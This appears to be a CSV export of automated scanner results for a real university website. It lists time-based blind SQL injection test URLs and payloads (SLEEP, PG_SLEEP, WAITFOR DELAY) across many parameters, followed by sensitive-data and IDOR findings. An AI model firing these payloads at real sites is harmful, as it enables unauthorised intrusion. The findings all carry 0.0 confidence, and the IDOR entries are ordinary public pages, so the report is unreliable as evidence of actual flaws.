Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Sensitive Data Exposure,Critical,0.0,Response Body (content match),Email Address match,Security impact varies based on specific exploitation.,Investigate and apply security best practices.
Sensitive Data Exposure,Critical,0.0,Response Body (content match),Credit Card Number match,Security impact varies based on specific exploitation.,Investigate and apply security best practices.
Sensitive Data Exposure,High,0.0,URL Path: https://kahedu.edu.in/.,.,Security impact varies based on specific exploitation.,Investigate and apply security best practices.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#financial-analytics,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#financial-analytics,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#commerce-it,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#commerce-it,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#international-accounting-finance,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/controller-of-examinations/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/controller-of-examinations/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/controller-of-examinations/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/controller-of-examinations/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/finance-officer/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/finance-officer/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/finance-officer/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/finance-officer/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/deans/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/deans/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/deans/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/deans/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/about-us/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/about-us/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/about-us/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/about-us/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#professional-accounting,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/dean-performing-arts/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/admission-procedure/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/how-to-apply/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/ug-programs/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/ug-programs/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/pg-programs/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/pg-programs/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/pg-programs/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/research-programs/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/admission-details/research-programs/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/admissions/downloads/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/examinations/examination-reforms/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730016981-2b26a56c-dc5b,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730016981-2b26a56c-dc5b,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/research/timeline-presentation/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/research/list-of-ph-d-scholars/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/research/research-guide-lines/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/research/research-guide-lines/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/campus-life/barrier-free-environment/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/students/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/tbi/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/#1574016446128-383c784a-e794,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/#1765953418532-757ae383-041d,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
